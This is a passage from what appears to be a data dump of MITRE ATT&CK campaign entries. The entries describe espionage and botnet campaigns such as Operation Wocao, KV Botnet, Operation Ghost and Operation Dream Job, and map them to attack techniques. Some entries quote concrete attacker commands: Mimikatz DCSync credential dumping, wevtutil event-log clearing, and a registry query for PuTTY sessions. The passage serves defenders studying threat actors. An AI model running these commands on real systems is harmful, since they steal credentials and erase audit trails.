through multiple infected systems.[1] .003 Multi-hop Proxy During Operation Wocao, threat actors executed commands through the installed web shell via Tor exit nodes.[1] Enterprise T1012 Query Registry During Operation Wocao, the threat actors executed /c cd /d c:\\windows\\temp\\ & reg query HKEY_CURRENT_USER\\Software\\<username>\\PuTTY\\Sessions\\ to detect recent PuTTY sessions, likely to further lateral movement.[1] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares During Operation Wocao, threat actors used Impacket's smbexec.py as well as accessing the C$ and IPC$ shares to move laterally.[1] Enterprise T1018 Remote System Discovery During Operation Wocao, threat actors used nbtscan and ping to discover remote systems, as well as dsquery subnet on a domain controller to retrieve all subnets in the Active Directory.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During Operation Wocao, threat actors used scheduled tasks to execute malicious PowerShell code on remote systems.[1] Enterprise T1505 .003 Server Software Component: Web Shell During Operation Wocao, threat actors used their own web shells, as well as those previously placed on target systems by other threat actors, for reconnaissance and lateral movement.[1] Enterprise T1518 Software Discovery During Operation Wocao, threat actors collected a list of installed software on the infected system.[1] .001 Security Software Discovery During Operation Wocao, threat actors used scripts to detect security software.[1] Enterprise T1558 .003 Steal or Forge Kerberos Tickets: Kerberoasting During Operation Wocao, threat actors used PowerSploit's Invoke-Kerberoast module to request encrypted service tickets and bruteforce the passwords of Windows service accounts offline.[1] Enterprise T1082 System Information Discovery During Operation Wocao, threat actors discovered the local disks attached to the system and their hardware information including manufacturer and model, as well as the OS versions of systems connected to a targeted network.[1] Enterprise T1016 System Network Configuration Discovery During Operation Wocao, threat actors discovered the local network configuration with ipconfig.[1] .001 Internet Connection Discovery During Operation Wocao, threat actors used a Visual Basic script that checked for internet connectivity.[1] Enterprise T1049 System Network Connections Discovery During Operation Wocao, threat actors collected a list of open connections on the infected system using netstat and checks whether it has an internet connection.[1] Enterprise T1033 System Owner/User Discovery During Operation Wocao, threat actors enumerated sessions and users on a remote host, and identified privileged users logged into a targeted system.[1] Enterprise T1007 System Service Discovery During Operation Wocao, threat actors used the tasklist command to search for one of its backdoors.[1] Enterprise T1569 .002 System Services: Service Execution During Operation Wocao, threat actors created services on remote systems for execution purposes.[1] Enterprise T1124 System Time Discovery During Operation Wocao, threat actors used the time command to retrieve the current time of a compromised system.[1] Enterprise T1552 .004 Unsecured Credentials: Private Keys During Operation Wocao, threat actors used Mimikatz to dump certificates and private keys from the Windows certificate store.[1] Enterprise T1078 Valid Accounts During Operation Wocao, threat actors used valid VPN credentials to gain initial access.[1] .002 Domain Accounts During Operation Wocao, threat actors used domain credentials, including domain admin, for lateral movement and privilege escalation.[1] .003 Local Accounts During Operation Wocao, threat actors used local account credentials found during the intrusion for lateral movement and privilege escalation.[1] Enterprise T1047 Windows Management Instrumentation During Operation Wocao, threat actors has used WMI to execute commands.[1] Software ID Name Description S0521 BloodHound During Operation Wocao, threat actors used BloodHound discover trust between domains.[1] S0105 dsquery During Operation Wocao, threat actors used dsquery to retrieve all subnets in the Active Directory.[1] S0357 Impacket During Operation Wocao, threat actors used smbexec.py and psexec.py from Impacket for lateral movement.[1] S0002 Mimikatz During Operation Wocao, threat actors used Mimikatz with the privilege::debug and lsadump::dcsync /all flags to dump account credentials.[1] S0104 netstat During Operation Wocao, threat actors used netstat to identify specific ports.[1] S0194 PowerSploit During Operation Wocao, threat actors used PowerSploit\u2019s Invoke-Kerberoast module to bruteforce passwords and retrieve encrypted service tickets.[1] S0029 PsExec During Operation Wocao, threat actors used PsExec to interact with other systems inside the internal network.[1] S0183 Tor During Operation Wocao, threat actors used Tor exit nodes to execute commands.[1] S0645 Wevtutil During Operation Wocao, threat actors used Wevtutil to delete system and security event logs with wevtutil cl system and wevtutil cl security.[1] References Dantzig, M. v., Schamper, E. (2019, December 19). Operation Wocao: Shining a light on one of China\u2019s hidden hacking groups. Retrieved October 8, 2020. "
},
{
"id": 427,
"title": "KV Botnet Activity, Campaign C0035",
"path": "/campaigns/C0035/index.html",
"content": " KV Botnet Activity KV Botnet Activity consisted of exploitation of primarily \"end-of-life\" small office-home office (SOHO) equipment from manufacturers such as Cisco, NETGEAR, and DrayTek. KV Botnet Activity was used by Volt Typhoon to obfuscate connectivity to victims in multiple critical infrastructure segments, including energy and telecommunication companies and entities based on the US territory of Guam. While the KV Botnet is the most prominent element of this campaign, it overlaps with another botnet cluster referred to as the JDY cluster.[1] This botnet was disrupted by US law enforcement entities in early 2024 after periods of activity from October 2022 through January 2024.[2] ID: C0035 First Seen: October 2022 [1] Last Seen: January 2024 [2] Version: 1.0 Created: 10 June 2024 Last Modified: 03 October 2024 Version Permalink Live Version Groups ID Name Description G1017 Volt Typhoon Volt Typhoon used KV Botnet Activity to build intermediate communication chains between operators and victims, such as identified access to victims in Guam.[1] Techniques Used Domain ID Name Use Enterprise T1583 .003 Acquire Infrastructure: Virtual Private Server KV Botnet Activity used acquired Virtual Private Servers as control systems for devices infected with KV Botnet malware.[1] Enterprise T1059 .004 Command and Scripting Interpreter: Unix Shell KV Botnet Activity utilizes multiple Bash scripts during botnet installation stages, and the final botnet payload allows for running commands in the Bash shell.[1] Enterprise T1584 .008 Compromise Infrastructure: Network Devices KV Botnet Activity focuses on compromise of small office-home office (SOHO) network devices to build the subsequent botnet.[1] Enterprise T1573 Encrypted Channel KV Botnet Activity command and control activity includes transmission of an RSA public key in communication from the server, but this is followed by subsequent negotiation stages that represent a form of handshake similar to TLS negotiation.[1] Enterprise T1546 Event Triggered Execution KV Botnet Activity involves managing events on victim systems via libevent to execute a callback function when any running process contains the following references in their path without also having a reference to bioset: busybox, wget, curl, tftp, telnetd, or lua. If the bioset string is not found, the related process is terminated.[1] Enterprise T1083 File and Directory Discovery KV Botnet Activity gathers a list of filenames from the following locations during execution of the final botnet stage: \\/usr\\/sbin\\/, \\/usr\\/bin\\/, \\/sbin\\/, \\/pfrm2.0\\/bin\\/, \\/usr\\/local\\/bin\\/.[1] Enterprise T1222 .002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification KV Botnet Activity altered permissions on downloaded tools and payloads to enable execution on victim machines.[1] Enterprise T1564 .013 Hide Artifacts: Bind Mounts KV Botnet Activity leveraged a bind mount to bind itself to the /proc/ file path before deleting its files from the /tmp/ directory.[1] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools KV Botnet Activity used various scripts to remove or disable security tools, such as http_watchdog and firewallsd, as well as tools related to other botnet infections, such as mips_ff, on victim devices.[1] Enterprise T1070 .004 Indicator Removal: File Deletion KV Botnet Activity removes on-disk copies of tools and other artifacts after it the primary botnet payload has been loaded into memory on the victim device.[1] Enterprise T1105 Ingress Tool Transfer KV Botnet Activity included the use of scripts to download additional payloads when compromising network nodes.[1] Enterprise T1036 Masquerading KV Botnet Activity involves changing process filename to pr_set_mm_exe_file and process name to pr_set_name during later infection stages.[1] .004 Masquerade Task or Service KV Botnet Activity installation steps include first identifying, then stopping, any process containing [kworker\\/0:1], then renaming its initial installation stage to this process name.[1] Enterprise T1095 Non-Application Layer Protocol KV Botnet Activity command and control traffic uses a non-standard, likely custom protocol for communication.[1] Enterprise T1571 Non-Standard Port KV Botnet Activity generates a random port number greater than 30,000 to serve as the listener for subsequent command and control activity.[1] Enterprise T1057 Process Discovery Scripts associated with KV Botnet Activity initial deployment can identify processes related to security tools and other botnet families for follow-on disabling during installation.[1] Enterprise T1055 .009 Process Injection: Proc Memory KV Botnet Activity final payload installation includes mounting and binding to the \\/proc\\/ filepath on the victim system to enable subsequent operation in memory while also removing on-disk artifacts.[1] Enterprise T1518 .001 Software Discovery: Security Software Discovery KV Botnet Activity involved removal of security tools, as well as other identified IOT malware, from compromised devices.[1] Enterprise T1082 System Information Discovery KV Botnet Activity includes use of native system tools, such as uname, to obtain information about victim device architecture, as well as gathering other system information such as the victim's hosts file and CPU utilization.[1] Enterprise T1016 System Network Configuration Discovery KV Botnet Activity gathers victim IP information during initial installation stages.[1] References Black Lotus Labs. (2023, December 13). Routers Roasting On An Open Firewall: The KV-Botnet Investigation. Retrieved June 10, 2024. US Department of Justice. (2024, January 31). U.S. Government Disrupts Botnet People\u2019s Republic of China Used to Conceal Hacking of Critical Infrastructure. Retrieved June 10, 2024. "
},
{
"id": 428,
"title": "Operation Sharpshooter, Campaign C0013",
"path": "/campaigns/C0013/index.html",
"content": " Operation Sharpshooter Operation Sharpshooter was a global cyber espionage campaign that targeted nuclear, defense, government, energy, and financial companies, with many located in Germany, Turkey, the United Kingdom, and the United States. Security researchers noted the campaign shared many similarities with previous Lazarus Group operations, including fake job recruitment lures and shared malware code.[1][2][3] ID: C0013 First Seen: September 2017 [3] Last Seen: March 2019 [3] Version: 1.0 Created: 26 September 2022 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .006 Acquire Infrastructure: Web Services For Operation Sharpshooter, the threat actors used Dropbox to host lure documents and their first-stage downloader.[1] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder During Operation Sharpshooter, a first-stage downloader installed Rising Sun to %Startup%\\mssync.exe on a compromised host.[1] Enterprise T1059 .005 Command and Scripting Interpreter: Visual Basic During Operation Sharpshooter, the threat actors used a VBA macro to execute a simple downloader that installed Rising Sun.[1] Enterprise T1584 .004 Compromise Infrastructure: Server For Operation Sharpshooter, the threat actors compromised a server they used as part of the campaign's infrastructure.[2] Enterprise T1587 .001 Develop Capabilities: Malware For Operation Sharpshooter, the threat actors used the Rising Sun modular backdoor.[1] Enterprise T1105 Ingress Tool Transfer During Operation Sharpshooter, additional payloads were downloaded after a target was infected with a first-stage downloader.[1] Enterprise T1559 .002 Inter-Process Communication: Dynamic Data Exchange During Operation Sharpshooter, threat actors sent malicious Word OLE documents to victims.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location During Operation Sharpshooter, threat actors installed Rising Sun in the Startup folder and disguised it as mssync.exe.[1] Enterprise T1106 Native API During Operation Sharpshooter, the first stage downloader resolved various Windows libraries and APIs, including LoadLibraryA(), GetProcAddress(), and CreateProcessA().[1] Enterprise T1055 Process Injection During Operation Sharpshooter, threat actors leveraged embedded shellcode to inject a downloader into the memory of Word.[3] Enterprise T1090 Proxy For Operation Sharpshooter, the threat actors used the ExpressVPN service to hide their location.[2] Enterprise T1608 .001 Stage Capabilities: Upload Malware For Operation Sharpshooter, the threat actors staged malicious files on Dropbox and other websites.[1] Enterprise T1204 .002 User Execution: Malicious File During Operation Sharpshooter, the threat actors relied on victims executing malicious Microsoft Word or PDF files.[1] Software ID Name Description S0448 Rising Sun During the investigation of Operation Sharpshooter, security researchers identified Rising Sun in 87 organizations across the globe and subsequently discovered three variants.[1][2] References Sherstobitoff, R., Malhotra, A., et. al.. (2018, December 18). Operation Sharpshooter Campaign Targets Global Defense, Critical Infrastructure. Retrieved May 14, 2020. I. Ilascu. (2019, March 3). Op 'Sharpshooter' Connected to North Korea's Lazarus Group. Retrieved September 26, 2022. L. O'Donnell. (2019, March 3). RSAC 2019: New Operation Sharpshooter Data Reveals Higher Complexity, Scope. Retrieved September 26, 2022. "
},
{
"id": 429,
"title": "C0011, Campaign C0011",
"path": "/campaigns/C0011/index.html",
"content": " C0011 C0011 was a suspected cyber espionage campaign conducted by Transparent Tribe that targeted students at universities and colleges in India. Security researchers noted this campaign against students was a significant shift from Transparent Tribe's historic targeting Indian government, military, and think tank personnel, and assessed it was still ongoing as of July 2022.[1] ID: C0011 First Seen: December 2021 [1] Last Seen: July 2022 [1] Version: 1.0 Created: 22 September 2022 Last Modified: 16 April 2025 Version Permalink Live Version Groups ID Name Description G0134 Transparent Tribe [1] Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For C0011, Transparent Tribe registered domains likely designed to appear relevant to student targets in India.[1] Enterprise T1059 .005 Command and Scripting Interpreter: Visual Basic For C0011, Transparent Tribe used malicious VBA macros within a lure document as part of the Crimson malware installation process onto a compromised host.[1] Enterprise T1587 .003 Develop Capabilities: Digital Certificates For C0011, Transparent Tribe established SSL certificates on the typo-squatted domains the group registered.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment During C0011, Transparent Tribe sent malicious attachments via email to student targets in India.[1] .002 Phishing: Spearphishing Link During C0011, Transparent Tribe sent emails containing a malicious link to student targets in India.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware For C0011, Transparent Tribe hosted malicious documents on domains registered by the group.[1] Enterprise T1204 .001 User Execution: Malicious Link During C0011, Transparent Tribe relied on student targets to click on a malicious link sent via email.[1] .002 User Execution: Malicious File During C0011, Transparent Tribe relied on a student target to open a malicious document delivered via email.[1] Software ID Name Description S0115 Crimson For C0011, Transparent Tribe used an updated version of Crimson.[1] References N. Baisini. (2022, July 13). Transparent Tribe begins targeting education sector in latest campaign. Retrieved September 22, 2022. "
},
{
"id": 430,
"title": "C0033, Campaign C0033",
"path": "/campaigns/C0033/index.html",
"content": " C0033 C0033 was a PROMETHIUM campaign during which they used StrongPity to target Android users. C0033 was the first publicly documented mobile campaign for PROMETHIUM, who previously used Windows-based techniques.[1] ID: C0033 First Seen: May 2016 [2] Last Seen: January 2023 [1] Contributors: Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India Version: 1.0 Created: 28 March 2024 Last Modified: 11 April 2024 Version Permalink Live Version Groups ID Name Description G0056 PROMETHIUM [3][4] Techniques Used Domain ID Name Use Mobile T1517 Access Notifications During C0033, PROMETHIUM used StrongPity to collect message notifications from 17 applications.[1] Mobile T1437 .001 Application Layer Protocol: Web Protocols During C0033, PROMETHIUM used StrongPity to communicate with the C2 server using HTTPS.[1] Mobile T1532 Archive Collected Data During C0033, PROMETHIUM used StrongPity to exfiltrate encrypted data to the C2 server.[1] Mobile T1429 Audio Capture During C0033, PROMETHIUM used StrongPity to record phone calls.[1] Mobile T1456 Drive-By Compromise During C0033, PROMETHIUM distributed StrongPity through the compromised official Syrian E-Gov website.[5] Mobile T1521 .001 Encrypted Channel: Symmetric Cryptography During C0033, PROMETHIUM used StrongPity to encrypt C2 communication using AES.[1] Mobile T1624 .001 Event Triggered Execution: Broadcast Receivers During C0033, PROMETHIUM used StrongPity to receive the following broadcast events to establish persistence: BOOT_COMPLETED, BATTERY_LOW,USER_PRESENT, SCREEN_ON, SCREEN_OFF, or CONNECTIVITY_CHANGE.[1] Mobile T1646 Exfiltration Over C2 Channel During C0033, PROMETHIUM used StrongPity to exfiltrate to the C2 server using HTTPS.[1][5] Mobile T1420 File and Directory Discovery During C0033, PROMETHIUM used StrongPity to collect file lists on the victim device.[1] Mobile T1629 .003 Impair Defenses: Disable or Modify Tools During C0033, PROMETHIUM used StrongPity to modify permissions on a rooted device and tried to disable the SecurityLogAgent application.[1] Mobile T1544 Ingress Tool Transfer During C0033, PROMETHIUM used StrongPity to receive files from the C2 and execute them via the parent application.[1] Mobile T1430 Location Tracking During C0033, PROMETHIUM used StrongPity to access the device\u2019s location.[1] Mobile T1655 .001 Masquerading: Match Legitimate Name or Location During C0033, PROMETHIUM used StrongPity on a compromised website to distribute a malicious version of a legitimate application.[5] Mobile T1406 Obfuscated Files or Information During C0033, PROMETHIUM used StrongPity to obfuscate code and strings to evade detection.[1] Mobile T1636 .002 Protected User Data: Call Log During C0033, PROMETHIUM used StrongPity to collect call logs.[1] .003 Protected User Data: Contact List During C0033, PROMETHIUM used StrongPity to collect the device\u2019s contact list.[1] .004 Protected User Data: SMS Messages During C0033, PROMETHIUM used StrongPity to collect SMS messages.[1] Mobile T1418 Software Discovery During C0033, PROMETHIUM used StrongPity to obtain a list of installed applications.[1] Mobile T1426 System Information Discovery During C0033, PROMETHIUM used StrongPity to collect the device\u2019s information, such as SIM serial number, SIM serial number, etc.[1] Mobile T1421 System Network Connections Discovery During C0033, PROMETHIUM used StrongPity to collect information regarding available Wi-Fi networks.[5] Software ID Name Description S0491 StrongPity [3][4] References Stefanko, L. (2023, January 10). StrongPity espionage campaign targeting Android users. Retrieved January 31, 2023. Baumgartner, K. (2016, October 3). On the StrongPity Waterhole Attacks Targeting Italian and Belgian Encryption Users. Retrieved March 28, 2024. Mercer, W. et al. (2020, June 29). PROMETHIUM extends global reach with StrongPity3 APT. Retrieved July 20, 2020. Tudorica, R. et al. (2020, June 30). StrongPity APT - Revealing Trojanized Tools, Working Hours and Infrastructure. Retrieved July 20, 2020. Dong, Z. et al. (2021, July 21). StrongPity APT Group Deploys Android Malware for the First Time. Retrieved March 19, 2023. "
},
{
"id": 431,
"title": "Pikabot Distribution February 2024, Campaign C0036",
"path": "/campaigns/C0036/index.html",
"content": " Pikabot Distribution February 2024 Pikabot was distributed in Pikabot Distribution February 2024 using malicious emails with embedded links leading to malicious ZIP archives requiring user interaction for follow-on infection. The version of Pikabot distributed featured significant changes over the 2023 variant, including reduced code complexity and simplified obfuscation mechanisms.[1][2] ID: C0036 First Seen: February 2024 [1] Last Seen: February 2024 [1] Contributors: Inna Danilevich, U.S. Bank Version: 1.0 Created: 17 July 2024 Last Modified: 28 October 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Pikabot Distribution February 2024 passed execution from obfuscated JavaScript files to PowerShell scripts to download and install Pikabot.[1] .007 Command and Scripting Interpreter: JavaScript Pikabot Distribution February 2024 utilized obfuscated JavaScript files for initial Pikabot payload download.[1] Enterprise T1574 Hijack Execution Flow Pikabot Distribution February 2024 utilized a tampered legitimate executable, grepWinNP3.exe, for its first stage Pikabot loader, modifying the open-source tool to execute malicious code when launched.[1] Enterprise T1566 .002 Phishing: Spearphishing Link Pikabot Distribution February 2024 utilized emails with hyperlinks leading to malicious ZIP archive files containing scripts to download and install Pikabot.[1] Software ID Name Description S1145 Pikabot Pikabot Distribution February 2024 distributed Pikabot for initial access purposes in February 2024.[1][2] References Daniel Stepanic & Salim Bitam. (2024, February 23). PIKABOT, I choose you!. Retrieved July 12, 2024. Nikolaos Pantazopoulos. (2024, February 12). The (D)Evolution of Pikabot. Retrieved July 17, 2024. "
},
{
"id": 432,
"title": "Operation Ghost, Campaign C0023",
"path": "/campaigns/C0023/index.html",
"content": " Operation Ghost Operation Ghost was an APT29 campaign starting in 2013 that included operations against ministries of foreign affairs in Europe and the Washington, D.C. embassy of a European Union country. During Operation Ghost, APT29 used new families of malware and leveraged web services, steganography, and unique C2 infrastructure for each victim.[1] ID: C0023 First Seen: September 2013 [1] Last Seen: October 2019 [1] Version: 1.0 Created: 23 March 2023 Last Modified: 16 April 2025 Version Permalink Live Version Groups ID Name Description G0016 APT29 [1] Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For Operation Ghost, APT29 registered domains for use in C2 including some crafted to appear as existing legitimate domains.[1] Enterprise T1001 .002 Data Obfuscation: Steganography During Operation Ghost, APT29 used steganography to hide the communications between the implants and their C&C servers.[1] Enterprise T1587 .001 Develop Capabilities: Malware For Operation Ghost, APT29 used new strains of malware including FatDuke, MiniDuke, RegDuke, and PolyglotDuke.[1] Enterprise T1585 .001 Establish Accounts: Social Media Accounts For Operation Ghost, APT29 registered Twitter accounts to host C2 nodes.[1] Enterprise T1546 .003 Event Triggered Execution: Windows Management Instrumentation Event Subscription During Operation Ghost, APT29 used WMI event subscriptions to establish persistence for malware.[1] Enterprise T1027 .003 Obfuscated Files or Information: Steganography During Operation Ghost, APT29 used steganography to hide payloads inside valid images.[1] Enterprise T1078 .002 Valid Accounts: Domain Accounts For Operation Ghost, APT29 used stolen administrator credentials for lateral movement on compromised networks.[1] Enterprise T1102 .002 Web Service: Bidirectional Communication For Operation Ghost, APT29 used social media platforms to hide communications to C2 servers.[1] Software ID Name Description S0512 FatDuke For Operation Ghost, APT29 used FatDuke as a third-stage backdoor.[1] S0051 MiniDuke For Operation Ghost, APT29 used MiniDuke as a second-stage backdoor.[1] S0518 PolyglotDuke For Operation Ghost, APT29 used PolyglotDuke as a first-stage downloader.[1] S0029 PsExec For Operation Ghost, APT29 used PsExec for lateral movement on compromised networks.[1] S0511 RegDuke For Operation Ghost, APT29 used RegDuke as a first-stage implant.[1] References Faou, M., Tartare, M., Dupuy, T. (2019, October). OPERATION GHOST. Retrieved September 23, 2020. "
},
{
"id": 433,
"title": "CostaRicto, Campaign C0004",
"path": "/campaigns/C0004/index.html",
"content": " CostaRicto CostaRicto was a suspected hacker-for-hire cyber espionage campaign that targeted multiple industries worldwide, with a large number being financial institutions. CostaRicto actors targeted organizations in Europe, the Americas, Asia, Australia, and Africa, with a large concentration in South Asia (especially India, Bangladesh, and Singapore), using custom malware, open source tools, and a complex network of proxies and SSH tunnels.[1] ID: C0004 First Seen: October 2019 [1] Last Seen: November 2020 [1] Version: 1.0 Created: 15 September 2022 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For CostaRicto, the threat actors established domains, some of which appeared to spoof legitimate domains.[1] Enterprise T1005 Data from Local System During CostaRicto, the threat actors collected data and files from compromised networks.[1] Enterprise T1587 .001 Develop Capabilities: Malware For CostaRicto, the threat actors used custom malware, including PS1, CostaBricks, and SombRAT.[1] Enterprise T1133 External Remote Services During CostaRicto, the threat actors set up remote tunneling using an SSH tool to maintain access to a compromised environment.[1] Enterprise T1105 Ingress Tool Transfer During CostaRicto, the threat actors downloaded malware and tools onto a compromised host.[1] Enterprise T1046 Network Service Discovery During CostaRicto, the threat actors employed nmap and pscan to scan target environments.[1] Enterprise T1588 .002 Obtain Capabilities: Tool During CostaRicto, the threat actors obtained open source tools to use in their operations.[1] Enterprise T1572 Protocol Tunneling During CostaRicto, the threat actors set up remote SSH tunneling into the victim's environment from a malicious domain.[1] Enterprise T1090 .003 Proxy: Multi-hop Proxy During CostaRicto, the threat actors used a layer of proxies to manage C2 communications.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During CostaRicto, the threat actors used scheduled tasks to download backdoor tools.[1] Software ID Name Description S0614 CostaBricks During CostaRicto, threat actors used a custom VM-based payload loader named CostaBricks.[1] S0194 PowerSploit During CostaRicto, threat actors used PowerSploit's Invoke-ReflectivePEInjection module.[1] S0613 PS1 During CostaRicto, threat actors used the 64-bit backdoor loader PS1.[1] S0029 PsExec During CostaRicto, threat actors used PsExec.[1] S0615 SombRAT During CostaRicto, threat actors used SombRAT in conjuction with CostaBricks and PowerSploit.[1] S0183 Tor During CostaRicto, threat actors used C2 servers managed through Tor.[1] References The BlackBerry Research and Intelligence Team. (2020, November 12). The CostaRicto Campaign: Cyber-Espionage Outsourced. Retrieved May 24, 2021. "
},
{
"id": 434,
"title": "FunnyDream, Campaign C0007",
"path": "/campaigns/C0007/index.html",
"content": " FunnyDream FunnyDream was a suspected Chinese cyber espionage campaign that targeted government and foreign organizations in Malaysia, the Philippines, Taiwan, Vietnam, and other parts of Southeast Asia. Security researchers linked the FunnyDream campaign to possible Chinese-speaking threat actors through the use of the Chinoxy backdoor and noted infrastructure overlap with the TAG-16 threat group.[1][2][3] ID: C0007 First Seen: July 2018 [2] Last Seen: November 2020 [1] Version: 1.0 Created: 20 September 2022 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For FunnyDream, the threat actors registered a variety of domains.[1] Enterprise T1560 .001 Archive Collected Data: Archive via Utility During FunnyDream, the threat actors used 7zr.exe to add collected files to an archive.[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell During FunnyDream, the threat actors used cmd.exe to execute the wmiexec.vbs script.[1] .005 Command and Scripting Interpreter: Visual Basic During FunnyDream, the threat actors used a Visual Basic script to run remote commands.[1] Enterprise T1585 .002 Establish Accounts: Email Accounts For FunnyDream, the threat actors likely established an identified email account to register a variety of domains that were used during the campaign.[1] Enterprise T1105 Ingress Tool Transfer During FunnyDream, the threat actors downloaded additional droppers and backdoors onto a compromised system.[1] Enterprise T1588 .001 Obtain Capabilities: Malware For FunnyDream, the threat actors used a new backdoor named FunnyDream.[1] .002 Obtain Capabilities: Tool For FunnyDream, the threat actors used a modified version of the open source PcShare remote administration tool.[1] Enterprise T1057 Process Discovery During FunnyDream, the threat actors used Tasklist on targeted systems.[1] Enterprise T1018 Remote System Discovery During FunnyDream, the threat actors used several tools and batch files to map victims' internal networks.[1] Enterprise T1082 System Information Discovery During FunnyDream, the threat actors used Systeminfo to collect information on targeted hosts.[1] Enterprise T1016 System Network Configuration Discovery During FunnyDream, the threat actors used ipconfig for discovery on remote systems.[1] Enterprise T1049 System Network Connections Discovery During FunnyDream, the threat actors used netstat to discover network connections on remote systems.[1] Enterprise T1047 Windows Management Instrumentation During FunnyDream, the threat actors used wmiexec.vbs to run remote commands.[1] Software ID Name Description S1043 ccf32 During FunnyDream, ccf32 was used to collect data.[1] S1041 Chinoxy During FunnyDream, Chinoxy was used to gain persistence and deploy other malware components.[1] S1044 FunnyDream During the FunnyDream campaign, the FunnyDream backdoor was used to execute multiple components and exfiltrate files.[1] S0100 ipconfig [1] S0104 netstat [1] S1050 PcShare During FunnyDream the threat actors used a customized version of PcShare.[1] S0096 Systeminfo [1] S0057 Tasklist [1] References Vrabie, V. (2020, November). Dissecting a Chinese APT Targeting South Eastern Asian Government Institutions. Retrieved September 19, 2022. Global Research and Analysis Team. (2020, April 30). APT trends report Q1 2020. Retrieved September 19, 2022. Insikt Group. (2021, December 8). Chinese State-Sponsored Cyber Espionage Activity Supports Expansion of Regional Power and Influence in Southeast Asia. Retrieved September 19, 2022. "
},
{
"id": 435,
"title": "Operation Dream Job, Operation North Star, Operation Interception, Campaign C0022",
"path": "/campaigns/C0022/index.html",
"content": " Operation Dream Job Operation Dream Job was a cyber espionage operation likely conducted by Lazarus Group that targeted the defense, aerospace, government, and other sectors in the United States, Israel, Australia, Russia, and India. In at least one case, the cyber actors tried to monetize their network access to conduct a business email compromise (BEC) operation. In 2020, security researchers noted overlapping TTPs, to include fake job lures and code similarities, between Operation Dream Job, Operation North Star, and Operation Interception; by 2022 security researchers described Operation Dream Job as an umbrella term covering both Operation Interception and Operation North Star.[1][2][3][4] ID: C0022 First Seen: September 2019 [3] Last Seen: August 2020 [1] \u24d8 Associated Campaigns: Operation North Star, Operation Interception Version: 1.2 Created: 17 March 2023 Last Modified: 11 April 2024 Version Permalink Live Version Associated Campaign Descriptions Name Description Operation North Star [2][5] Operation Interception [3] Groups ID Name Description G0032 Lazarus Group [1][2][5][3] Techniques Used Domain ID Name Use Enterprise T1087 .002 Account Discovery: Domain Account During Operation Dream Job, Lazarus Group queried compromised victim's active directory servers to obtain the list of employees including administrator accounts.[3] Enterprise T1583 .001 Acquire Infrastructure: Domains During Operation Dream Job, Lazarus Group registered a domain name identical to that of a compromised company as part of their BEC effort.[3] .004 Acquire Infrastructure: Server During Operation Dream Job, Lazarus Group acquired servers to host their malicious tools.[3] .006 Acquire Infrastructure: Web Services During Operation Dream Job, Lazarus Group used file hosting services like DropBox and OneDrive.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols During Operation Dream Job, Lazarus Group uses HTTP and HTTPS to contact actor-controlled C2 servers.[2] Enterprise T1560 .001 Archive Collected Data: Archive via Utility During Operation Dream Job, Lazarus Group archived victim's data into a RAR file.[3] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder During Operation Dream Job, Lazarus Group placed LNK files into the victims' startup folder for persistence.[2] Enterprise T1110 Brute Force During Operation Dream Job, Lazarus Group performed brute force attacks against administrator accounts.[3] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During Operation Dream Job, Lazarus Group used PowerShell commands to explore the environment of compromised victims.[3] .003 Command and Scripting Interpreter: Windows Command Shell During Operation Dream Job, Lazarus Group launched malicious DLL files, created new folders, and renamed folders with the use of the Windows command shell.[3][2] .005 Command and Scripting Interpreter: Visual Basic During Operation Dream Job, Lazarus Group executed a VBA written malicious macro after victims download malicious DOTM files; Lazarus Group also used Visual Basic macro code to extract a double Base64 encoded DLL implant.[1][2] Enterprise T1584 .001 Compromise Infrastructure: Domains For Operation Dream Job, Lazarus Group compromised domains in Italy and other countries for their C2 infrastructure.[2][5] .004 Compromise Infrastructure: Server For Operation Dream Job, Lazarus Group compromised servers to host their malicious tools.[1][3][2] Enterprise T1005 Data from Local System During Operation Dream Job, Lazarus Group used malicious Trojans and DLL files to exfiltrate data from an infected host.[1][2] Enterprise T1622 Debugger Evasion During Operation Dream Job, Lazarus Group used tools that used the IsDebuggerPresent call to detect debuggers.[1] Enterprise T1587 .001 Develop Capabilities: Malware For Operation Dream Job, Lazarus Group developed custom tools such as Sumarta, DBLL Dropper, Torisma, and DRATzarus for their operations.[1][3][2][5] .002 Develop Capabilities: Code Signing Certificates During Operation Dream Job, Lazarus Group digitally signed their malware and the dbxcli utility.[3] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography During Operation Dream Job, Lazarus Group used an AES key to communicate with their C2 server.[2] Enterprise T1585 .001 Establish Accounts: Social Media Accounts For Operation Dream Job, Lazarus Group created fake LinkedIn accounts for their targeting efforts.[1][3] .002 Establish Accounts: Email Accounts During Operation Dream Job, Lazarus Group created fake email accounts to correspond with fake LinkedIn personas; Lazarus Group also established email accounts to match those of the victim as part of their BEC attempt.[3] Enterprise T1041 Exfiltration Over C2 Channel During Operation Dream Job, Lazarus Group exfiltrated data from a compromised host to actor-controlled C2 servers.[1] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage During Operation Dream Job, Lazarus Group used a custom build of open-source command-line dbxcli to exfiltrate stolen data to Dropbox.[3][1] Enterprise T1083 File and Directory Discovery During Operation Dream Job, Lazarus Group conducted word searches within documents on a compromised host in search of security and financial matters.[1] Enterprise T1589 Gather 